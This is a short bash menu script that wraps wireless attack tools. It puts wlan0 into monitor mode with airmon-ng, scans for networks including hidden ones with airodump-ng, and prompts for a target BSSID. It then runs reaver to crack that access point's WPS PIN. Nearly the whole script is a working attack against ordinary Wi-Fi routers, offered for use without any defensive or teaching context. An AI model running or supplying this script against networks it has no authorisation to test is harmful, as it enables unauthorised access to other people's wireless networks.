#!/bin/bash
while true
do
echo '1-scan wifi and check the hiden network '
echo '2-get info wirless'
echo '3-crack wpspin by reaver'
read -p 'test>> ' menu
if [ "$menu" == 1 ]
then
airmon-ng start wlan0
airodump-ng  mon0
elif [ "$menu" == 2 ]
then
ifconfig
elif [ "$menu" == 3 ]
then
read -p 'what bssid target' menu
reaver -i mon0 -b $menu -vv
else 
echo 'not found' 
fi

done
